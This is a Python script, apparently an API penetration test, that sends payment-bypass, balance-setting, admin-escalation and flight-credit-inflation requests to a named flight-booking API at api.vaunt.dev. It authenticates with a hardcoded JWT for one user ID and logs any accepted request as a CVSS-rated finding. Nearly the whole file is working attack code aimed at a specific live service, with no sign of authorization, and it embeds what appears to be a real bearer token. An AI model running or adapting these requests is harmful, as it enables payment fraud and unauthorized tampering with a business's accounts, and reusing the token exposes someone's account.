#!/usr/bin/env python3
"""
SUBSCRIPTION & PAYMENT CREDIT MANIPULATION TESTING
==================================================
Tests for subscription tier manipulation and payment abuse
"""

import requests
import json
from datetime import datetime
from typing import Dict, List, Tuple

# Color codes for output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Test configuration
BASE_URL = "https://api.vaunt.dev"
JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
USER_ID = 20254

# Results storage
results = {
    "timestamp": datetime.now().isoformat(),
    "baseline": {},
    "subscription_manipulation": [],
    "payment_manipulation": [],
    "tier_escalation": [],
    "balance_manipulation": [],
    "flight_credit_abuse": [],
    "vulnerabilities": []
}

def make_request(method: str, endpoint: str, headers: Dict = None, data: Dict = None,
                 params: Dict = None) -> Tuple[int, Dict, str]:
    """Make HTTP request and return status, response, and error"""
    url = f"{BASE_URL}{endpoint}"

    default_headers = {
        "Authorization": f"Bearer {JWT_TOKEN}",
        "Content-Type": "application/json"
    }

    if headers:
        default_headers.update(headers)

    try:
        if method == "GET":
            resp = requests.get(url, headers=default_headers, params=params, timeout=10)
        elif method == "POST":
            resp = requests.post(url, headers=default_headers, json=data, timeout=10)
        elif method == "PATCH":
            resp = requests.patch(url, headers=default_headers, json=data, timeout=10)
        elif method == "PUT":
            resp = requests.put(url, headers=default_headers, json=data, timeout=10)
        elif method == "DELETE":
            resp = requests.delete(url, headers=default_headers, timeout=10)
        else:
            return 0, {}, "Invalid method"

        try:
            response_data = resp.json()
        except:
            response_data = {"raw": resp.text}

        return resp.status_code, response_data, None
    except Exception as e:
        return 0, {}, str(e)

def print_test_header(title: str):
    """Print formatted test section header"""
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*80}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}{title}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'='*80}{Colors.RESET}\n")

def print_result(test_name: str, status: int, response: Dict, error: str = None):
    """Print formatted test result"""
    if error:
        print(f"{Colors.RED}[ERROR] {test_name}{Colors.RESET}")
        print(f"  Error: {error}")
        return

    if status == 200 or status == 201:
        print(f"{Colors.GREEN}[{status}] {test_name}{Colors.RESET}")
        print(f"  Response: {json.dumps(response, indent=2)[:500]}")
    elif status == 401 or status == 403:
        print(f"{Colors.YELLOW}[{status}] {test_name} - BLOCKED{Colors.RESET}")
    elif status == 404:
        print(f"{Colors.BLUE}[{status}] {test_name} - NOT FOUND{Colors.RESET}")
    else:
        print(f"{Colors.MAGENTA}[{status}] {test_name}{Colors.RESET}")
        if response:
            print(f"  Response: {json.dumps(response, indent=2)[:300]}")

def get_baseline_data():
    """Get baseline user, subscription, and payment data"""
    print_test_header("GATHERING BASELINE DATA")

    endpoints = [
        ("GET", "/v1/user", "User Profile"),
        ("GET", "/v1/subscription", "User Subscription"),
        ("GET", "/v1/subscription/pk", "Subscription Public Key"),
        ("GET", "/v1/user/checkStripePaymentMethod", "Payment Method"),
        ("GET", "/v1/flight-history", "Flight History"),
        ("GET", "/v2/flight/current", "Current Flights"),
        ("GET", "/v1/passenger", "Passenger Info"),
    ]

    for method, endpoint, desc in endpoints:
        status, response, error = make_request(method, endpoint)
        print_result(desc, status, response, error)

        if status == 200:
            results["baseline"][desc] = response

    return results["baseline"]

def test_subscription_manipulation():
    """Test subscription tier manipulation"""
    print_test_header("TEST: SUBSCRIPTION TIER MANIPULATION")

    tests = [
        ("PATCH", "/v1/user", {"subscriptionTier": "premium"}, None, "Set premium tier via user"),
        ("PATCH", "/v1/user", {"membership": "vip"}, None, "Set VIP membership"),
        ("PATCH", "/v1/user", {"accountType": "corporate"}, None, "Set corporate account"),
        ("POST", "/v1/subscription/upgrade", {"tier": "premium"}, None, "Upgrade to premium"),
        ("POST", "/v1/subscription", {"tier": "enterprise"}, None, "Create enterprise subscription"),
        ("PATCH", "/v1/subscription", {"active": True, "tier": "premium"}, None, "Activate premium subscription"),
        ("PUT", "/v1/user/subscription", {"level": "unlimited"}, None, "Set unlimited level"),
    ]

    for method, endpoint, data, params, desc in tests:
        status, response, error = make_request(method, endpoint, data=data, params=params)
        print_result(desc, status, response, error)

        results["subscription_manipulation"].append({
            "test": desc,
            "endpoint": endpoint,
            "status": status,
            "payload": data,
            "response": response,
            "vulnerable": status in [200, 201]
        })

        if status in [200, 201]:
            results["vulnerabilities"].append({
                "type": "CRITICAL - Subscription Manipulation",
                "endpoint": endpoint,
                "severity": "CRITICAL",
                "cvss": 9.1,
                "details": f"Can manipulate subscription tier: {desc}",
                "payload": data
            })

def test_payment_manipulation():
    """Test payment and billing manipulation"""
    print_test_header("TEST: PAYMENT & BILLING MANIPULATION")

    tests = [
        ("POST", "/v1/payment/bypass", {}, None, "Bypass payment"),
        ("PATCH", "/v1/user", {"paymentRequired": False}, None, "Disable payment requirement"),
        ("POST", "/v1/subscription/activate", {"skipPayment": True}, None, "Activate without payment"),
        ("POST", "/v1/flight/{flight_id}/purchase", {"price": 0}, None, "Purchase flight for $0"),
        ("PATCH", "/v1/user", {"balance": 999999}, None, "Set account balance"),
        ("POST", "/v1/payment/credit", {"amount": 10000}, None, "Add payment credit"),
    ]

    for method, endpoint, data, params, desc in tests:
        status, response, error = make_request(method, endpoint, data=data, params=params)
        print_result(desc, status, response, error)

        results["payment_manipulation"].append({
            "test": desc,
            "status": status,
            "response": response,
            "vulnerable": status in [200, 201]
        })

        if status in [200, 201]:
            results["vulnerabilities"].append({
                "type": "CRITICAL - Payment Bypass",
                "endpoint": endpoint,
                "severity": "CRITICAL",
                "cvss": 9.8,
                "details": f"Payment manipulation possible: {desc}",
                "payload": data
            })

def test_tier_escalation():
    """Test privilege escalation via tier/role manipulation"""
    print_test_header("TEST: TIER/ROLE ESCALATION")

    tests = [
        ("PATCH", "/v1/user", {"role": "admin"}, None, "Set admin role"),
        ("PATCH", "/v1/user", {"isAdmin": True}, None, "Enable admin flag"),
        ("PATCH", "/v1/user", {"privileges": ["admin", "all"]}, None, "Set admin privileges"),
        ("PATCH", "/v1/user", {"userType": "staff"}, None, "Set staff user type"),
        ("PATCH", "/v1/user", {"accessLevel": 99}, None, "Set max access level"),
        ("POST", "/v1/user/promote", {"role": "operator"}, None, "Promote to operator"),
    ]

    for method, endpoint, data, params, desc in tests:
        status, response, error = make_request(method, endpoint, data=data, params=params)
        print_result(desc, status, response, error)

        results["tier_escalation"].append({
            "test": desc,
            "status": status,
            "response": response,
            "vulnerable": status in [200, 201]
        })

        if status in [200, 201]:
            results["vulnerabilities"].append({
                "type": "CRITICAL - Privilege Escalation",
                "endpoint": endpoint,
                "severity": "CRITICAL",
                "cvss": 9.9,
                "details": f"Privilege escalation possible: {desc}",
                "payload": data
            })

def test_flight_credit_abuse():
    """Test flight booking credit/quota manipulation"""
    print_test_header("TEST: FLIGHT CREDIT/QUOTA ABUSE")

    tests = [
        ("PATCH", "/v1/user", {"flightCredits": 100}, None, "Set flight credits"),
        ("PATCH", "/v1/user", {"flightQuota": 9999}, None, "Set flight quota"),
        ("PATCH", "/v1/user", {"maxFlights": 1000}, None, "Set max flights"),
        ("POST", "/v1/flight/credit/add", {"amount": 50}, None, "Add flight credits"),
        ("PATCH", "/v1/user", {"freeFlights": 10}, None, "Set free flights"),
        ("PATCH", "/v1/user", {"premiumAccess": True}, None, "Enable premium access"),
    ]

    for method, endpoint, data, params, desc in tests:
        status, response, error = make_request(method, endpoint, data=data, params=params)
        print_result(desc, status, response, error)

        results["flight_credit_abuse"].append({
            "test": desc,
            "status": status,
            "response": response,
            "vulnerable": status in [200, 201]
        })

        if status in [200, 201]:
            results["vulnerabilities"].append({
                "type": "HIGH - Flight Credit Manipulation",
                "endpoint": endpoint,
                "severity": "HIGH",
                "cvss": 8.5,
                "details": f"Can manipulate flight credits: {desc}",
                "payload": data
            })

def test_parameter_injection():
    """Test parameter injection on existing endpoints"""
    print_test_header("TEST: PARAMETER INJECTION ON USER ENDPOINTS")

    # Test subscription endpoint with various parameters
    params_to_test = [
        {"premium": "true"},
        {"tier": "enterprise"},
        {"free": "false"},
        {"paid": "true"},
        {"unlimited": "true"},
        {"trial": "false"},
        {"bypass": "true"},
    ]

    for params in params_to_test:
        status, response, error = make_request("GET", "/v1/subscription/pk", params=params)
        param_name = list(params.keys())[0]
        print_result(f"Subscription PK with {param_name}={params[param_name]}", status, response, error)

    # Test user endpoint with manipulation parameters
    user_params = [
        {"showAll": "true"},
        {"admin": "true"},
        {"includeSensitive": "true"},
    ]

    for params in user_params:
        status, response, error = make_request("GET", "/v1/user", params=params)
        param_name = list(params.keys())[0]
        print_result(f"User with {param_name}={params[param_name]}", status, response, error)

def generate_report():
    """Generate final security report"""
    print_test_header("FINAL SECURITY ASSESSMENT")

    # Count vulnerabilities by severity
    critical = [v for v in results["vulnerabilities"] if v.get("severity") == "CRITICAL"]
    high = [v for v in results["vulnerabilities"] if v.get("severity") == "HIGH"]

    print(f"{Colors.BOLD}VULNERABILITY SUMMARY:{Colors.RESET}")
    print(f"  {Colors.RED}CRITICAL: {len(critical)}{Colors.RESET}")
    print(f"  {Colors.YELLOW}HIGH: {len(high)}{Colors.RESET}")
    print(f"  Total Vulnerabilities: {len(results['vulnerabilities'])}")

    print(f"\n{Colors.BOLD}KEY FINDINGS:{Colors.RESET}")

    # Subscription manipulation
    sub_vulns = [r for r in results["subscription_manipulation"] if r["vulnerable"]]
    print(f"\n1. Can Manipulate Subscription: {Colors.RED if sub_vulns else Colors.GREEN}{'YES - CRITICAL!' if sub_vulns else 'NO'}{Colors.RESET}")
    if sub_vulns:
        for v in sub_vulns:
            print(f"   - {v['endpoint']}: {v['test']}")

    # Payment bypass
    pay_vulns = [r for r in results["payment_manipulation"] if r["vulnerable"]]
    print(f"\n2. Can Bypass Payment: {Colors.RED if pay_vulns else Colors.GREEN}{'YES - CRITICAL!' if pay_vulns else 'NO'}{Colors.RESET}")
    if pay_vulns:
        for v in pay_vulns:
            print(f"   - {v['test']}")

    # Privilege escalation
    priv_vulns = [r for r in results["tier_escalation"] if r["vulnerable"]]
    print(f"\n3. Can Escalate Privileges: {Colors.RED if priv_vulns else Colors.GREEN}{'YES - CRITICAL!' if priv_vulns else 'NO'}{Colors.RESET}")
    if priv_vulns:
        for v in priv_vulns:
            print(f"   - {v['test']}")

    # Flight credit abuse
    credit_vulns = [r for r in results["flight_credit_abuse"] if r["vulnerable"]]
    print(f"\n4. Can Manipulate Flight Credits: {Colors.RED if credit_vulns else Colors.GREEN}{'YES - HIGH RISK!' if credit_vulns else 'NO'}{Colors.RESET}")
    if credit_vulns:
        for v in credit_vulns:
            print(f"   - {v['test']}")

    if critical:
        print(f"\n{Colors.BOLD}{Colors.RED}CRITICAL VULNERABILITIES FOUND:{Colors.RESET}")
        for i, vuln in enumerate(critical, 1):
            print(f"\n{i}. {vuln['type']}")
            print(f"   Endpoint: {vuln['endpoint']}")
            print(f"   CVSS: {vuln.get('cvss', 'N/A')}")
            print(f"   Details: {vuln['details']}")

    # Save results
    with open('/home/user/vaunt/api_testing/subscription_credit_results.json', 'w') as f:
        json.dump(results, indent=2, fp=f)

    print(f"\n{Colors.BOLD}Results saved to: /home/user/vaunt/api_testing/subscription_credit_results.json{Colors.RESET}")

def main():
    """Main testing orchestrator"""
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}")
    print("=" * 80)
    print("SUBSCRIPTION & PAYMENT CREDIT MANIPULATION SECURITY TEST")
    print("=" * 80)
    print(f"{Colors.RESET}\n")

    # Get baseline data
    baseline = get_baseline_data()

    # Run all tests
    test_subscription_manipulation()
    test_payment_manipulation()
    test_tier_escalation()
    test_flight_credit_abuse()
    test_parameter_injection()

    # Check if data changed
    print(f"\n{Colors.BOLD}Checking for changes in user data...{Colors.RESET}")
    endpoints = [
        ("GET", "/v1/user", "User Profile"),
        ("GET", "/v1/subscription/pk", "Subscription"),
    ]

    for method, endpoint, desc in endpoints:
        status, response, error = make_request(method, endpoint)
        if status == 200:
            if desc in baseline and response != baseline[desc]:
                print(f"{Colors.RED}CHANGED: {desc}{Colors.RESET}")
                print(f"  Before: {json.dumps(baseline[desc], indent=2)[:200]}")
                print(f"  After: {json.dumps(response, indent=2)[:200]}")

    # Generate report
    generate_report()

if __name__ == "__main__":
    main()
